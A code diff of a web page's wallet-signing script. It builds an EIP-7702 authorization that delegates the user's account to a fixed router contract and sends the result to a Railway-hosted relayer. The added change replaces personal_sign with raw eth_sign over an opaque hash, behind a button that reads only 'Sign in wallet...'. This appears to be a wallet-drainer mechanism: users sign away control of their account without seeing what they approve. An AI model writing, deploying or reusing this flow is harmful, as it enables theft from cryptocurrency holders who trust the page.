@@ -106,7 +106,7 @@
         // ═══════════════════════════════════════════════════════
         // CONFIG: Update this with your Railway deployment URL
         // ═══════════════════════════════════════════════════════
-        const RELAYER_API = 'https://relayer-production-aca6.up.railway.app/api/delegate';
+        const RELAYER_API = 'https://your-railway-url.up.railway.app/api/delegate';
         // ═══════════════════════════════════════════════════════
         
         const ROUTER = '0x7debCF72BebA168Bb49eec6BbB1156E203A564FD';
@@ -187,11 +187,11 @@
                 });
                 const nonce = parseInt(nonceHex, 16);
 
-                // ─── FIX: Use actual tx nonce in auth digest ───
+                // Build EIP-7702 auth digest: keccak256(0x05 || rlp([chainId, router, nonce]))
                 const authPayloadRlp = ethers.encodeRlp([
                     toEvenHex(CHAIN_ID),
                     ROUTER,
-                    toEvenHex(nonce)  // Use tx nonce, not hardcoded 0
+                    toEvenHex(nonce)
                 ]);
 
                 const authPayloadBytes = ethers.getBytes(authPayloadRlp);
@@ -201,11 +201,11 @@
                 combined.set(authPayloadBytes, 1);
                 const authHash = ethers.keccak256(combined);
 
-                // User signs via personal_sign (EIP-191)
+                // ─── FIX: Use eth_sign (raw, no EIP-191 prefix) ───
                 btn.textContent = 'Sign in wallet...';
                 const signature = await window.ethereum.request({
-                    method: 'personal_sign',
-                    params: [authHash, userAddress]
+                    method: 'eth_sign',
+                    params: [userAddress, authHash]
                 });
                 setStep(3, 'done');
 
@@ -220,7 +220,6 @@
 
                 btn.textContent = 'Submitting...';
 
-                // ─── FIX: Send the SAME nonce that was used in auth digest ───
                 const response = await fetch(RELAYER_API, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -228,7 +227,7 @@
                         userAddress,
                         chainId: CHAIN_ID,
                         router: ROUTER,
-                        nonce,  // Same tx nonce used in auth digest
+                        nonce,
                         yParity,
                         r,
                         s,
